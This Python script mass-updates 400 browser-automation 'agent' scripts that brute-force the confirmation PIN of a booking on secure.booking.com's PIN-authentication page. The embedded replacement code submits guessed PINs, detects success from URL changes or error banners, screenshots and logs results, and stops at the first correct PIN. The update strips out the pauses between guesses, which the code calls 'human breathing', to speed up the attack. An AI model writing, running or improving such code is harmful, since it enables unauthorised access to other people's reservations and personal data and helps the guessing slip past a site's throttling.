#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 BEHAVIOR LOGIC UPDATER
Update all 400 agents to use behavior-based logic instead of time-based waits
"""

import os
import re

def update_agent_behavior_logic(filepath):
    """Update a single agent file to use behavior-based logic"""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Remove WAIT_TIME definition
        content = re.sub(r'WAIT_TIME = 10.*', '# WAIT_TIME removed - using behavior-based logic instead!', content)
        
        # Update the wait logic section
        old_logic = r'''# LOGIC 3: Wait for results - either error banner OR URL change
            print\("⏳ Waiting for results..."\)
            print\("⏳ Giving extra time for page to redirect..."\)
            time\.sleep\(5\)  # Extra wait for redirect
            
            # Wait for either success \(URL change\) or error banner to appear
            try:
                page\.wait_for_function\("""
                    \(\) => \{
                        // Check if URL contains success indicator
                        const urlChanged = window\.location\.href\.includes\('unique_order_id'\) \|\| 
                                         window\.location\.href\.includes\('booking_details'\) \|\|
                                         window\.location\.href\.includes\('confirmation'\) \|\|
                                         window\.location\.href\.includes\('/help/reservation'\);
                        
                        // Check if error banner appears
                        const errorBanner = document\.querySelector\('\.bui-alert--error'\) !== null \|\|
                                          document\.querySelector\('\[class\*="error"\]'\) !== null \|\|
                                          document\.querySelector\('\.alert-danger'\) !== null;
                        
                        return urlChanged \|\| errorBanner;
                    \}
                """, timeout=20000\)
            except:
                print\("⚠️ No clear result after 20s, checking current state..."\)

            # Check results
            current_url = page\.url
            print\(f"🔍 Current URL: \{current_url\}"\)
            
            # Check for various elements on the page
            error_elements = page\.query_selector_all\('\.bui-alert--error, \[class\*="error"\], \.alert-danger'\)'''
        
        new_logic = '''# LOGIC 3: Wait for results - behavior-based detection
            print("⏳ Waiting for page response...")
            
            # Wait for either success (URL change) or error message to appear
            try:
                page.wait_for_function("""
                    () => {
                        // Check if URL contains success indicator
                        const urlChanged = window.location.href.includes('unique_order_id') || 
                                         window.location.href.includes('booking_details') ||
                                         window.location.href.includes('confirmation') ||
                                         window.location.href.includes('/help/reservation');
                        
                        // Check if error banner appears
                        const errorBanner = document.querySelector('.bui-alert__content') !== null ||
                                          document.querySelector('.bui-alert--error') !== null ||
                                          document.querySelector('[class*="error"]') !== null;
                        
                        return urlChanged || errorBanner;
                    }
                """, timeout=30000)  # 30 second max wait for response
            except:
                print("⚠️ No clear result after 30s, checking current state...")

            # Check results with improved error detection
            current_url = page.url
            print(f"🔍 Current URL: {current_url}")
            
            # Enhanced error detection using boss's selector
            if page.locator("div.bui-alert__content").is_visible():
                error_text = page.locator("div.bui-alert__content").text_content()
                if "We couldn't find a booking" in error_text:
                    print("❌ Error detected: Booking not found")
                    page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_FAIL_{AGENT_ID}.png")
                    log_result(pin, "FAILURE", current_url)
                    fail_count += 1
                else:
                    print(f"❌ Error detected: {error_text}")
                    page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_ERROR_{AGENT_ID}.png")
                    log_result(pin, "ERROR", current_url)
                    fail_count += 1'''
        
        content = re.sub(old_logic, new_logic, content, flags=re.DOTALL)
        
        # Update success/failure logic
        old_success = r'''# Check for SUCCESS: URL contains success indicators
            if \("unique_order_id" in current_url or 
                "booking_details" in current_url or 
                "/help/reservation" in current_url or
                current_url != "https://secure\.booking\.com/help/confirmation_pin_auth"\):.*?
            # Check for FAILURE: error banner detected
            elif len\(error_elements\) > 0:
                print\(f"❌ PIN \{pin\} is INCORRECT \(error banner detected\)"\)
                page\.screenshot\(path=f"\{SCREEN_DIR\}/\{BOOKING_ID\}_\{pin\}_FAIL_\{AGENT_ID\}\.png"\)
                log_result\(pin, "FAILURE", current_url\)
                fail_count \+= 1'''
        
        new_success = '''# Check for SUCCESS: URL contains success indicators
            elif ("unique_order_id" in current_url or 
                "booking_details" in current_url or 
                "/help/reservation" in current_url or
                current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
                print(f"🎉 SUCCESS! PIN {pin} is CORRECT! (URL changed)")
                print(f"✅ Success URL: {current_url}")
                page.screenshot(path=f"{SCREEN_DIR}/{BOOKING_ID}_{pin}_SUCCESS_{AGENT_ID}.png")
                log_result(pin, "SUCCESS", current_url)
                log_success(pin, current_url)
                success_count += 1
                print("🎉 SUCCESS FOUND! Mission accomplished!")
                break  # Stop testing, we found the PIN!'''
        
        content = re.sub(old_success, new_success, content, flags=re.DOTALL)
        
        # Remove time-based waits
        content = re.sub(r'print\(f"⏳ Human breathing\.\.\. waiting \{WAIT_TIME\}s before next PIN\.\.\."\)', 'print(f"⏳ Moving to next PIN...")', content)
        content = re.sub(r'time\.sleep\(WAIT_TIME\)', '# No time.sleep - behavior-based logic only!', content)
        
        # Write back the updated content
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return True
        
    except Exception as e:
        print(f"❌ Error updating {filepath}: {e}")
        return False

def main():
    print("🎯 UPDATING ALL AGENTS TO BEHAVIOR-BASED LOGIC")
    print("=" * 60)
    
    batches = [
        ('A', 1, 100),
        ('B', 1, 100),
        ('C', 1, 100),
        ('D', 1, 100)
    ]
    
    updated_count = 0
    error_count = 0
    
    for batch, start, end in batches:
        print(f"\n🔄 Updating Batch {batch} agents...")
        
        for i in range(start, end + 1):
            agent_num = f"{i:03d}"
            filename = f"agent_{agent_num}{batch}.py"
            
            if os.path.exists(filename):
                if update_agent_behavior_logic(filename):
                    print(f"✅ Updated {filename}")
                    updated_count += 1
                else:
                    print(f"❌ Failed to update {filename}")
                    error_count += 1
            else:
                print(f"⚠️ File not found: {filename}")
                error_count += 1
    
    print(f"\n🎉 BEHAVIOR LOGIC UPDATE COMPLETE!")
    print(f"✅ Updated files: {updated_count}")
    print(f"❌ Errors: {error_count}")
    print(f"📊 Total processed: {updated_count + error_count}")
    print(f"\n🚀 All agents now use BEHAVIOR-BASED LOGIC!")
    print(f"⏳ No more time waits - smart detection only!")

if __name__ == "__main__":
    main()
